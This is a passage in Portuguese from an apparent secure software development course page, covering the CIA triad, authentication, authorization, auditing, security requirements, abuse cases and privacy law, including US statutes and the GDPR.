software fique indisponível.</li> </ul> <p>Este conjunto de Confidencialidade, Integridade e Disponibilidade (CIA) às vezes é chamado de tríade CIA.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/319vipt5rrgx-image.png><img alt="A Tríade da CIA" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/319vipt5rrgx-image.png></a></p> <p><strong>A Tríade da CIA</strong></p> <p>Muitos adicionam mais um objetivo de segurança: <strong>não-repúdio</strong> ou <strong>responsabilização</strong>.</p> <p>O ponto de não-repúdio ou responsabilização é que se alguém toma certas ações, o sistema deve ser capaz de provar isso mais tarde, mesmo que a pessoa envolvida negue posteriormente.</p> <p>Exemplos de tais ações são transferir uma grande quantia de dinheiro, excluir algo importante, enviar uma mensagem importante ou receber uma mensagem importante. Alguns sistemas não têm tais requisitos e, mesmo quando têm, algumas pessoas consideram isso um caso especial de integridade. Algumas pessoas adicionam outros objetivos também. Não importa como você categorize as coisas, é importante saber claramente o que o sistema deve fazer. Ter algumas categorias simples pode ajudá-lo a fazer isso.</p> <p>Esses objetivos de segurança precisam de alguns mecanismos de suporte. Por exemplo, confidencialidade e integridade exigem que haja uma maneira de determinar se uma ação é autorizada (a menos que todas as solicitações sejam autorizadas). Aqui estão alguns mecanismos de suporte comuns:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <strong>Identificação e Autenticação (I&amp;A)</strong>: Exigir que os usuários se identifiquem e comprovem (autentiquem) sua identidade antes de realizar qualquer ação que exija autorização. Por exemplo, eles podem usar um nome de usuário ou endereço de e-mail como identidade e usar uma senha ou token de hardware para autenticar que realmente são o usuário. Isso normalmente é feito por meio de um processo de login.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <strong>Autorização</strong>: Determine o que o usuário tem permissão (autorização) para fazer antes de decidir fazê-lo. Você pode pensar em autorização como uma lista do que cada usuário tem permissão para fazer. Se for fácil para um invasor adicionar autorizações, então I&amp;A segura significa pouco. Isso é crucial para implementar confidencialidade e/ou integridade. Atenção: as palavras <em>autenticação</em> e <em>autorização</em> soam parecidas, mas não são a mesma coisa. Você pode saber exatamente quem é alguém (autenticação), mas ainda assim não permitir que essa pessoa faça algo (autorização).</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <strong>Auditoria (também conhecida como registro)</strong>: Registre eventos importantes para ajudar a detectar e se recuperar de ataques. Normalmente, esses eventos incluem login, logout e modificação de informações importantes. A auditoria costuma ser crucial para implementar requisitos de não repúdio/responsabilização.</li> </ul> <p>O que você faz especificamente depende do software que está desenvolvendo. Se estiver desenvolvendo uma biblioteca de nível inferior, você pode não estar suportando diretamente nenhum desses mecanismos de suporte, mas ainda precisa garantir que o que você está fazendo se encaixe em um programa maior.</p> <h2 id=requisitos-de-seguranca>Requisitos de segurança<a class=headerlink href=#requisitos-de-seguranca title="Permanent link">¶</a></h2> <p>Requisitos são simplesmente o que um produto ou serviço precisa fazer ou ser.</p> <p>Para os nossos propósitos, inclua nos requisitos tudo o que for exigido por <strong>lei ou regulamento</strong>, bem como qualquer coisa importante para seus (potenciais) clientes/usuários.</p> <p>Em alguns casos, o software deve estar em conformidade com leis ou regulamentos específicos.</p> <p>Isso é especialmente verdadeiro em áreas onde as vulnerabilidades têm maior probabilidade de causar danos significativos (como sistemas médicos, financeiros e militares). Isso também se aplica se você planeja vender software, ou um sistema com software, em diversas jurisdições legais (portanto, pode haver muitas leis ou regulamentos aplicáveis). <strong>Novamente, para nossos propósitos, todos esses são requisitos</strong>.</p> <p>Os requisitos podem não ser registrados em um único documento formal. Às vezes, cada novo requisito específico é simplesmente aceito como um problema em um rastreador de problemas/bugs. Na maioria dos projetos de desenvolvimento de software, os requisitos são identificados ao longo do tempo em discussões com seus usuários.</p> <p>Os requisitos nem <em>precisam</em> ser escritos para serem usados, especialmente em projetos pequenos. No entanto, pelo menos no caso de segurança, é uma boa ideia registrar os requisitos de segurança de alto nível em um único lugar. Assim, quando alguém estiver pensando em usar ou modificar seu software, terá uma ideia do que o sistema está tentando realizar em termos de segurança.</p> <p>É claro que os requisitos reais dependem do que você está tentando realizar.</p> <h2 id=objetivos-de-seguranca-comuns>Objetivos de Segurança Comuns<a class=headerlink href=#objetivos-de-seguranca-comuns title="Permanent link">¶</a></h2> <p>Então, como você pode determinar os requisitos de segurança para um sistema específico? Uma maneira de identificar os requisitos de segurança é pensar nos objetivos de segurança comuns e nas funções de segurança de suporte que <em>já</em> discutimos e determinar os requisitos específicos para o seu sistema em cada categoria.</p> <p>Em particular, pense em como cada um se aplica ao tipo de informação que seu programa gerenciará. Vamos analisar cada objetivo de segurança e função de segurança de suporte e discutir alguns pontos a serem considerados:</p> <h3 id=confidencialidade-ler-sem-autorizacao>Confidencialidade ("Ler sem autorização")<a class=headerlink href=#confidencialidade-ler-sem-autorizacao title="Permanent link">¶</a></h3> <p>Identifique informações que não devem ser reveladas publicamente, como informações privadas sobre pessoas e sistemas. Quem deve ter permissão para ver isso? É possível evitar ter essas informações (já que não é possível revelar o que não se tem)? Se você armazena informações de senha para que as pessoas possam fazer login no seu sistema (também conhecida como autenticação de "entrada"), precisa armazenar essas informações de senha usando algoritmos especiais projetados para isso (como o Argon2id), como discutiremos mais adiante.</p> <h3 id=integridade-sem-modificacoes-nao-autorizadas>Integridade ("Sem modificações não autorizadas")<a class=headerlink href=#integridade-sem-modificacoes-nao-autorizadas title="Permanent link">¶</a></h3> <p>Identifique informações que somente algumas pessoas devem ter permissão para modificar e quem são essas pessoas.</p> <h3 id=disponibilidade-continua-funcionando-na-presenca-de-ataque>Disponibilidade ("Continua funcionando na presença de ataque")<a class=headerlink href=#disponibilidade-continua-funcionando-na-presenca-de-ataque title="Permanent link">¶</a></h3> <p>Qual é o impacto se não funcionar por um tempo - isso é sério? A disponibilidade raramente é absoluta. Se o seu sistema for acessível pela internet, a disponibilidade é muito desafiadora de fornecer; um invasor com bons recursos sempre pode usar um ataque de Negação de Serviço Distribuída (DDoS) para derrubar um site, pelo menos por um tempo.</p> <p>É possível trabalhar para conter ataques DDoS, mas no final pode se transformar em uma competição entre quantos recursos cada lado tem. Mesmo quando a disponibilidade não pode ser universalmente garantida, você ainda pode ter um software seguro concentrando-se nos itens de maior risco ( Nem todos os invasores são iguais: entendendo e prevenindo DoS em aplicativos da web , por Jacob Kaplan-Moss, 2020).</p> <p>Em muitos casos, concentre-se em desenvolver seu software para que não seja fácil sobrecarregar ou derrubar com entradas simples; torne possível escalar temporariamente o software adicionando rapidamente novos servidores; e implemente o software para que ele se recupere rapidamente quando um ataque termina. Para evitar o risco de o sistema ser destruído ou ter seus dados excluídos, projete o software de forma que seus dados sejam facilmente copiados e planeje backups.</p> <p>Certifique-se de que os dados possam ser copiados para um "armazenamento frio" (onde não possam ser corrompidos posteriormente se o software for corrompido). Se o sistema for copiado rotineiramente em backup durante as operações, você poderá recuperá-lo com relativa rapidez (pelo menos parcialmente). Portanto, sim, você pode ter disponibilidade como requisito, desde que suas limitações sejam claras.</p> <h3 id=nao-repudio-provar-que-alguem-fez-algo>Não-repúdio ("Provar que alguém fez algo")<a class=headerlink href=#nao-repudio-provar-que-alguem-fez-algo title="Permanent link">¶</a></h3> <p>Existe alguma ação que você queira provar que alguém realizou? Em muitos sistemas, isso não é crítico, mas em alguns é.</p> <h3 id=identidade-e-autenticacao-ia>Identidade e autenticação (I&amp;A)<a class=headerlink href=#identidade-e-autenticacao-ia title="Permanent link">¶</a></h3> <p>Como os usuários comprovarão sua identidade? Você precisa garantir que ninguém consiga falsificar um usuário legítimo. Normalmente, você deve oferecer suporte à autenticação de dois fatores (2FA), seja diretamente ou permitindo que os usuários comprovem sua identidade por meio de algum outro serviço compatível.</p> <h3 id=autorizacao>Autorização<a class=headerlink href=#autorizacao title="Permanent link">¶</a></h3> <p>Quem tem permissão para fazer o quê? Isso faz parte da confidencialidade e da integridade, mas se você pensar no papel das pessoas, além de pensar nas informações a serem protegidas, provavelmente terá uma ideia melhor.</p> <h3 id=auditoriaregistro>Auditoria/Registro<a class=headerlink href=#auditoriaregistro title="Permanent link">¶</a></h3> <p>Quais informações/eventos você deve registrar? Normalmente, você registra pelo menos login, logout e eventos importantes, como criação e exclusão de contas de usuário. Geralmente, um sistema deve registrar quando algo aconteceu (data e hora), o que aconteceu, qual componente do sistema fez isso e quem causou o acontecimento.</p> <h2 id=dicas-para-encontrar-requisitos-de-seguranca>Dicas para encontrar requisitos de segurança<a class=headerlink href=#dicas-para-encontrar-requisitos-de-seguranca title="Permanent link">¶</a></h2> <p>Às vezes, você verá documentos que usam os termos de segurança "sujeito" e "objeto":</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Um "sujeito" é algo que age (por exemplo, um usuário ou processo).</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Um "objeto" é algo que está sendo afetado (por exemplo, um arquivo ou porta de rede).</li> </ul> <p>Cada <strong>caso de uso</strong> é uma lista de interações entre atores e um sistema para atingir um objetivo. Isso levou a uma abordagem de segurança interessante: o desenvolvimento de <strong>casos de abuso ou casos de uso indevido</strong>.</p> <p>Um <strong>caso de abuso</strong> é uma lista de interações entre atores e um sistema com a intenção de causar danos (por exemplo, ao sistema, aos atores ou às partes interessadas).</p> <p>Um termo muito semelhante é "caso de uso indevido", uma descrição de um ato malicioso contra um sistema.</p> <p>Muitos acharam útil definir casos de abuso ou casos de uso indevido para, então, descrever como o sistema deve combater tal abuso/uso indevido.</p> <p>Ao pensar sobre abuso e uso indevido e descobrir como combatê-los precocemente, muitos danos podem ser evitados.</p> <p>Um aspecto importante sobre os requisitos de segurança é o tipo de invasor que você espera combater.</p> <p>Combater ataques direcionados por Estados-nação com muitos recursos é extremamente difícil; você precisa saber e aplicar mais do que este programa de certificação profissional pode cobrir por si só.</p> <p>No entanto, a maioria das pessoas não está tentando desenvolver sistemas que resistam a esses tipos de ataques.</p> <p>Neste programa, assumiremos que seu software deve resistir a ataques que um site comercial típico pode precisar combater, onde o invasor tem recursos limitados e os ataques geralmente não são altamente direcionados.</p> <p>Na comunidade de computadores, o termo "hacker" é amplamente utilizado para identificar "uma pessoa que se deleita em ter um profundo conhecimento do funcionamento interno de um sistema, computadores e redes de computadores em particular" ( IETF RFC 1983 ).</p> <p>Por essa definição, muitos hackers nunca atacam sistemas de computador, e muitos invasores não são hackers.</p> <p>Se você estiver procurando ideias para potenciais requisitos de segurança, uma fonte é o Common Criteria for Information Technology Security Evaluation (CC). O CC é um padrão internacional para avaliação de segurança, originalmente desenvolvido em 1994. A grande maioria dos softwares desenvolvidos hoje não passa por uma avaliação de CC, em parte porque costuma ser caro e demorado contratar um laboratório externo para avaliar formalmente seu software usando o CC.</p> <p>No entanto, você ainda pode consultar o CC para obter ideias, mesmo que não utilize um laboratório de avaliação. O CC está disponível publicamente e tem três partes: a parte 1 é uma introdução, a parte 2 é uma lista de requisitos funcionais de segurança comuns e a parte 3 é uma lista de requisitos comuns de garantia.</p> <p>A parte 2, em particular, é uma lista de "funções de segurança que você pode exigir". Se você suspeita que seu sistema precisará de alguns requisitos especiais de segurança, mas não tem certeza de quais são, a parte 2 fornece uma longa lista de ideias que podem ser úteis. Parte de sua terminologia é obscura, mas inclui um glossário que pode ajudar.</p> <p>Por fim: se já houver um software que faça algo parecido com o que você está desenvolvendo, analise seus recursos de segurança. Esses recursos foram adicionados por um motivo, e seu software pode precisar de pelo menos alguns deles também.</p> <h2 id=termos-chave-confianca-confiavel-e-nao-confiavel>Termos-chave: Confiança, Confiável e Não Confiável<a class=headerlink href=#termos-chave-confianca-confiavel-e-nao-confiavel title="Permanent link">¶</a></h2> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Um componente <em>confiável</em> é digno de confiança (para algum propósito).</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Confiança</em> , por outro lado, é a <em>decisão</em> de depender de algo para algum propósito. Você só deve confiar em coisas que tenham evidências adequadas de serem confiáveis. Vulnerabilidades de segurança ocorrem quando se confia em algo que não é suficientemente confiável.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Um <em>usuário não confiável</em> é aquele em quem você não confia completamente. Quaisquer dados de um usuário não confiável devem ser tratados com cuidado, pois um usuário não confiável pode ser um invasor.</li> </ul> <h2 id=o-que-e-privacidade-e-por-que-ela-e-importante>O que é privacidade e por que ela é importante?<a class=headerlink href=#o-que-e-privacidade-e-por-que-ela-e-importante title="Permanent link">¶</a></h2> <p>Segurança e privacidade estão inter-relacionadas, mas não são a mesma coisa.</p> <h3 id=o-que-significa-privacidade>O que significa privacidade?<a class=headerlink href=#o-que-significa-privacidade title="Permanent link">¶</a></h3> <p><a href=https://iapp.org/about/what-is-privacy/ >A Associação Internacional de Profissionais de Privacidade (IAPP), organização</a> sem fins lucrativos, define privacidade como <strong><em>“o direito de ser deixado em paz, ou a liberdade de interferência ou intrusão”.</em></strong></p> <p>Mais especificamente, afirma: <strong><em>“Privacidade da informação é o direito de ter algum controle sobre como suas informações pessoais são coletadas e usadas... diversas culturas têm visões amplamente divergentes sobre quais são os direitos de uma pessoa em relação à privacidade e como ela deve ser regulamentada”.</em></strong> </p> <p>A organização também contrasta privacidade e segurança: <strong>“<em>A privacidade de dados se concentra no uso e na governança de dados pessoais — aspectos como a implementação de políticas para garantir que as informações pessoais dos consumidores sejam coletadas, compartilhadas e usadas de maneira adequada”.</em></strong></p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Em outras palavras, privacidade significa proteger dados pessoais de indivíduos contra abusos.</li> </ul> <h2 id=por-que-a-privacidade-e-importante>Por que a privacidade é importante?<a class=headerlink href=#por-que-a-privacidade-e-importante title="Permanent link">¶</a></h2> <p>Embora alguns argumentem que a privacidade não é mais possível ou relevante, muitos outros discordam, e muitas leis foram implementadas em todo o mundo para proteger a privacidade.</p> <p>Um resumo acessível da posição generalizada de que a privacidade é importante é a palestra de Glenn Greenwald no TED <em><a href=https://www.ted.com/talks/glenn_greenwald_why_privacy_matters>"Por que a privacidade importa"</a></em> (2014). Aqui estão alguns de seus pontos (veja a palestra para mais detalhes):<em><a href=https://www.ted.com/talks/glenn_greenwald_why_privacy_matters></a></em></p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Pessoas que dizem: <em>"Se você está fazendo algo que não quer que outras pessoas saibam, talvez nem devesse estar fazendo"</em> estão engajadas em extrema autodepreciação. O que elas estão realmente dizendo é: <em>"Concordei em me tornar uma pessoa tão inofensiva, inofensiva e desinteressante que, na verdade, não tenho medo de que o governo saiba o que estou fazendo."</em></li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Muitas dessas mesmas pessoas [que fazem essas alegações] não agem dessa maneira, por exemplo, elas tomam muitas medidas para obter privacidade para si mesmas.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>“Há uma razão pela qual a privacidade é tão almejada universalmente e instintivamente... quando estamos em um estado em que podemos ser monitorados, onde podemos ser observados, nosso comportamento muda drasticamente... Há dezenas de estudos psicológicos que provam que, quando alguém sabe que pode estar sendo observado, o comportamento que adota é muito mais conformista e complacente.”</em></li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>“A vigilância em massa cria uma prisão na mente que é um meio muito mais sutil, embora muito mais eficaz, de promover a conformidade com as normas sociais ou com a ortodoxia social, muito mais eficaz do que a força bruta jamais poderia ser.”</em></li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>“Uma sociedade em que as pessoas podem ser monitoradas o tempo todo é uma sociedade que gera conformidade, obediência e submissão, e é por isso que todo tirano, do mais aberto ao mais sutil, anseia por esse sistema.”</em></li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>“Quando permitimos que exista uma sociedade na qual estamos sujeitos a monitoramento constante, permitimos que a essência da liberdade humana seja severamente prejudicada.”</em></li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Um sistema de vigilância em massa suprime nossa liberdade de todas as maneiras. Ele torna inaceitáveis ​​todos os tipos de escolhas comportamentais sem que percebamos que isso aconteceu.</em></li> </ul> <h2 id=requisitos-de-privacidade-abordagem-mais-simples-nao-colete-informacoes-pessoais>Requisitos de privacidade: abordagem mais simples - não colete informações pessoais<a class=headerlink href=#requisitos-de-privacidade-abordagem-mais-simples-nao-colete-informacoes-pessoais title="Permanent link">¶</a></h2> <p>O primeiro passo para abordar a privacidade é reconhecer que a privacidade é importante e, então, considerar como garantir que seu software forneça privacidade adequada se coletar informações sobre indivíduos.</p> <p>A abordagem mais simples para a privacidade, e muitas vezes o melhor ponto de partida, é <em>não</em> coletar informações sobre indivíduos, a menos que seja necessário.</p> <p>Se você não coletar as informações, não poderá divulgá-las posteriormente e não precisará determinar como impedir seu uso indevido. Eliminá-las é a melhor opção do ponto de vista da privacidade.</p> <p>Caso contrário, limite as informações pessoais ao estritamente necessário. Se precisar coletar informações sobre indivíduos, você deverá fornecer uma variedade de proteções para eles, pelo menos aquelas exigidas por lei e regulamentação. Isso pode ser complicado, pois muitas leis e regulamentações podem ser aplicáveis.</p> <h2 id=requisitos-de-privacidade-leis-e-regulamentos-de-privacidade>Requisitos de privacidade: leis e regulamentos de privacidade<a class=headerlink href=#requisitos-de-privacidade-leis-e-regulamentos-de-privacidade title="Permanent link">¶</a></h2> <p>Leis e regulamentações sobre privacidade são amplamente difundidas.</p> <p>Diferentes termos são usados ​​para elas, incluindo privacidade da informação, privacidade de dados e proteção de dados.</p> <p>O impacto ou não dessas leis e regulamentações no seu software depende do tipo de dados que ele coleta. Em muitos casos, o software não precisa fazer nada especial em relação à privacidade. No entanto, em outros casos, essas leis e regulamentações podem ser extremamente importantes.</p> <p>O Artigo 17 do Pacto Internacional sobre Direitos Civis e Políticos das Nações Unidas, de 1966, é amplamente ratificado e protege a privacidade. Ele diz:</p> <p>Ninguém sofrerá interferências arbitrárias ou ilegais em sua vida privada, em sua família, em seu domicílio ou em sua correspondência, nem ataques ilegais à sua honra e reputação. Toda pessoa tem direito à proteção da lei contra tais interferências ou ataques.</p> <p>Diferentes países, e províncias/estados dentro de cada país, têm leis diferentes em relação à privacidade. Aqui, discutiremos brevemente as abordagens dos EUA e da Europa.</p> <h2 id=requisitos-de-privacidade-estados-unidos>Requisitos de privacidade: Estados Unidos<a class=headerlink href=#requisitos-de-privacidade-estados-unidos title="Permanent link">¶</a></h2> <p>Os Estados Unidos (EUA) não possuem uma lei abrangente de privacidade de informações. Em vez disso, o governo federal dos EUA possui uma série de leis que abrangem circunstâncias específicas. Isso inclui a Lei de Direitos Educacionais e Privacidade da Família de 1974 (FERPA) para registros educacionais de alunos, a Lei de Portabilidade e Responsabilidade de Seguros de Saúde de 1996 (HIPAA) para dados relacionados à saúde, a Lei de Proteção à Privacidade Online de Crianças de 1998 (COPPA) para dados relacionados a crianças e a Lei de Transações de Crédito Justas e Precisas de 2003 (FACTA) para alguns dados financeiros.</p> <p>A <a href=https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf>Lei de Privacidade dos EUA de 1974 (5 USC 552a)</a> determina como as agências federais dos EUA devem manter registros sobre indivíduos que são cidadãos americanos e estrangeiros residentes permanentes legais. Por exemplo, elas devem:</p> <ul> <li>coletar apenas informações relevantes e necessárias para executar uma função da agência;</li> <li>explicar no momento em que as informações estão sendo coletadas, por que elas são necessárias e como serão usadas;</li> <li>garantir que os registros sejam usados ​​apenas para os motivos apresentados ou solicitar a permissão da pessoa quando outra finalidade para o uso dos registros for considerada necessária ou desejável;</li> <li>fornecer salvaguardas adequadas para proteger os registros contra acesso e divulgação não autorizados; e</li> <li>permitir que as pessoas vejam os registros mantidos sobre elas e fornecer a elas a oportunidade de corrigir imprecisões em seus registros.</li> </ul> <p>Alguns estados dos EUA possuem leis adicionais, por exemplo, a <a href="https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC%C2%A7ionNum=22575">Lei de Proteção à Privacidade Online da Califórnia (OPPA) de 2003</a> exige que operadores de sites comerciais ou serviços online <em>"que coletam informações de identificação pessoal por meio da internet sobre consumidores individuais residentes na Califórnia que usam ou visitam seu [site ou serviço] publiquem de forma visível sua política de privacidade..."</em> e a cumpram. Mais recentemente, a <a href="https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5">Lei de Privacidade do Consumidor da Califórnia de 2018 (CCPA)</a> , que entrou em vigor em 2020, concede aos residentes da Califórnia direitos adicionais para saber quais informações pessoais foram coletadas por empresas e para optar por não vender essas informações.</p> <h2 id=requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-i>Requisitos de privacidade: Regulamento Geral Europeu de Proteção de Dados (GDPR) I<a class=headerlink href=#requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-i title="Permanent link">¶</a></h2> <p>O Regulamento Geral sobre a Proteção de Dados (RGPD) da União Europeia protege os dados pessoais de titulares que se encontram na União Europeia (UE). Aplica-se independentemente de o tratamento de dados ocorrer ou não na UE e independentemente de os titulares serem ou não cidadãos europeus. Consequentemente, o RGPD aplica-se em muitas circunstâncias. </p> <p>Cumprir o GDPR é importante. Infrações graves podem resultar em multa de até € 20 milhões, ou 4% da receita anual global de uma empresa no exercício financeiro anterior, o que for <em>maior</em>.</p> <p>O <a href=https://gdpr-info.eu/art-4-gdpr/ >GPDR</a> define dados pessoais (que exigem proteção como tal) como <em>“qualquer informação relativa a uma pessoa singular identificada ou identificável ('titular dos dados'); uma pessoa singular identificável é aquela que pode ser identificada, direta ou indiretamente, em particular por referência a um identificador, como um nome, um número de identificação, dados de localização, um identificador online ou a um ou mais fatores específicos da identidade física, fisiológica, genética, mental, económica, cultural ou social dessa pessoa singular”.</em> </p> <p>Note que não são apenas os dados que identificam um indivíduo - são os dados que estão ligados aos dados que identificam um indivíduo. Por exemplo, o endereço postal de uma pessoa é um dado pessoal; detalhes sobre as competências ou preferências de uma pessoa também são dados pessoais se estiverem ligados, ou razoavelmente capazes de estarem ligados, a outras informações que identifiquem esse indivíduo.</p> <p>De acordo com o GDPR, alguns dados pessoais são considerados mais sensíveis e há restrições maiores quanto à sua coleta e processamento. Entre elas, estão:</p> <ul> <li>origem racial ou étnica</li> <li>opiniões políticas, crenças religiosas ou filosóficas ou filiação sindical</li> <li>dados genéticos</li> <li>dados biométricos para fins de identificação única de uma pessoa física</li> <li>dados relativos à saúde</li> <li>dados relativos à vida sexual ou orientação sexual de uma pessoa física.</li> </ul> <p>Dados pessoais são <em>tratados</em> sempre que uma operação é realizada sobre eles. Isso inclui a coleta, o armazenamento, a visualização, a transmissão e a exclusão, seja por meios automatizados ou não. No GDPR, um "controlador" é a pessoa ou organização que determina a finalidade e os meios do tratamento. Um "processador" é um terceiro que trata os dados em nome de um controlador.</p> <p>O GDPR define sete princípios básicos para o tratamento de dados pessoais. Esses princípios fundamentam as finalidades de todas as disposições específicas do GDPR. Compreendê-los contribui significativamente para uma boa compreensão inicial sobre se um uso específico de dados pessoais é aceitável.</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Responsabilidade</td> <td>Um controlador de dados pessoais é responsável pelos princípios acima e por demonstrar sua conformidade com eles.</td> </tr> <tr> <td>Integridade e Confidencialidade</td> <td>Processar dados pessoais de forma a garantir a segurança adequada.</td> </tr> <tr> <td>Limitação de Armazenamento</td> <td>Armazene dados pessoais em um formato que permita a identificação apenas pelo tempo necessário para os propósitos para os quais foram coletados.</td> </tr> <tr> <td>Precisão</td> <td>Mantenha os dados pessoais precisos e atualizados e tome todas as medidas razoáveis ​​para apagar ou retificar dados imprecisos.</td> </tr> <tr> <td>Minimização de Dados</td> <td>Limite os dados pessoais que você coleta ao que é adequado para esses propósitos.</td> </tr> <tr> <td>Limitação da Finalidade</td> <td>Processe dados pessoais somente de maneiras que sejam compatíveis com as finalidades legítimas para as quais foram coletados.</td> </tr> <tr> <td>Legalidade, Justiça e Transparencia</td> <td>Processar dados pessoais de forma legal, justa e transparente para o titular dos dados.</td> </tr> </tbody> </table> <h2 id=requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-ii>Requisitos de privacidade: Regulamento Geral Europeu de Proteção de Dados (GDPR) II<a class=headerlink href=#requisitos-de-privacidade-regulamento-geral-europeu-de-protecao-de-dados-gdpr-ii title="Permanent link">¶</a></h2> <p>Seis artigos do GDPR estabelecem direitos específicos concedidos a indivíduos em relação aos seus dados pessoais. Isso concede aos residentes da UE o direito de contatar um controlador de dados e solicitar que ele tome determinadas medidas ( <em>solicitações do GDPR</em> ). Como os residentes da UE têm esses direitos, sistemas de software e processos organizacionais devem ser projetados para viabilizá-los. Os tipos de solicitações descritos no GDPR incluem os seguintes:</p> <ul> <li><strong>Direito de Acesso</strong> (Art. 15) Os titulares dos dados podem solicitar que seus dados pessoais sejam tratados. Em caso afirmativo, podem obter "acesso" aos dados (por exemplo, uma cópia ou captura de tela) e informações sobre o tratamento.</li> <li><strong>Direito de Retificação</strong> (Art. 16) Os titulares dos dados podem ter dados imprecisos atualizados e corrigidos.</li> <li><strong>Direito ao Apagamento</strong> , também conhecido como "Direito ao Esquecimento" (Art. 17) Em determinadas circunstâncias, os titulares dos dados podem ter seus dados pessoais apagados.</li> <li><strong>Direito à Restrição do Tratamento</strong> (Art. 18) Em determinadas circunstâncias, os titulares dos dados podem restringir o tratamento dos seus dados pessoais. Os mesmos podem continuar a ser armazenados, a menos que também tenha sido efetuada uma solicitação de "Direito ao Apagamento".</li> <li><strong>Direito à Portabilidade de Dados</strong> (Art. 20) Em determinadas circunstâncias, os titulares dos dados podem ter seus dados pessoais exportados (por exemplo, fornecidos ao titular dos dados ou a terceiros em um formato estruturado, comumente usado e legível por máquina).</li> <li><strong>Direito de Objeção</strong> (Art. 21) Em determinadas circunstâncias, especialmente para fins de marketing direto e criação de perfil, os titulares dos dados podem se opor ao processamento de seus dados pessoais.</li> </ul> <p>Para processar dados pessoais, eles devem ser legais, ou seja, devem se enquadrar em pelo menos uma de várias categorias, incluindo as seguintes, entre outras:</p> <ul> <li><strong>Conformidade com a Lei</strong> Dados pessoais podem ser processados ​​se for necessário para o cumprimento de uma obrigação legal.</li> <li><strong>Execução de um Contrato com o Titular dos Dados</strong> Dados pessoais podem ser tratados se necessário para a execução de um contrato com o titular dos dados. <em>Observe que isso provavelmente não se aplica a um contrato com alguém que não seja o titular dos dados, como seu empregador.</em></li> <li><strong>Interesses Comerciais Legítimos:</strong> Dados pessoais podem ser processados ​​se isso for consistente com <em>"interesses legítimos",</em> a menos que os interesses do titular dos dados prevaleçam em contrário. Este pode ser um conceito mais ambíguo.</li> <li><strong>Consentimento</strong> Os dados pessoais podem ser processados ​​se o titular dos dados der seu consentimento.</li> </ul> <p>Observe que dados pessoais podem ser processados ​​mediante consentimento do titular. No entanto, para que o consentimento seja válido de acordo com o GDPR:</p> <ul> <li>Deve ser <em>"específico"</em> e <em>"informado"</em> (por exemplo, deve incluir uma descrição específica de quais dados estão sendo coletados e como serão usados);</li> <li>Exige uma <em>“ação afirmativa clara”</em> por parte do titular dos dados (por exemplo, exigir que o participante marque uma caixa de seleção e não que ela seja pré-marcada); e</li> <li>Deve ser livremente revogável (por exemplo, o titular dos dados deve poder retirar o consentimento a qualquer momento).</li> </ul> <p>Mesmo que o consentimento seja concedido, você também pode querer encontrar outra base legal para o processamento dos dados, especialmente se desejar retê-los. De acordo com o GDPR, você geralmente é proibido de reter dados pessoais sem uma base legal.</p> <p>De acordo com o GDPR, <em>a criação de perfil</em> é qualquer forma de processamento automatizado que envolva o uso de dados pessoais para avaliar aspectos dessa pessoa. A criação de perfil geralmente exige o consentimento explícito do indivíduo, o que significa que o indivíduo poderá revogá-lo a qualquer momento. Portanto, as atividades de criação de perfil normalmente exigem um maior grau de revisão e proteção dos dados pessoais aplicáveis.</p> <p>Para saber mais sobre o GDPR, você pode consultar os seguintes recursos:</p> <ul> <li><a href=http://data.europa.eu/eli/reg/2016/679/oj>O site oficial da UE para o texto do RGPD</a></li> <li><em><a href=https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/ >Guia do Regulamento Geral de Proteção de Dados (RGPD)</a></em></li> <li><em><a href=https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf>Soluções para um uso responsável da blockchain no contexto de dados pessoais</a></em></li> <li><em><a href=https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf>Segurança de Dados Pessoais</a></em></li> <li><em><a href="https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC%C2%A7ionNum=22575">Lei de Proteção à Privacidade Online da Califórnia, Capítulo 22. Requisitos de Privacidade da Internet [22575-22579]</a></em></li> </ul> <h1 id=requisitos-de-privacidade-telemetria>Requisitos de privacidade: Telemetria<a class=headerlink href=#requisitos-de-privacidade-telemetria title="Permanent 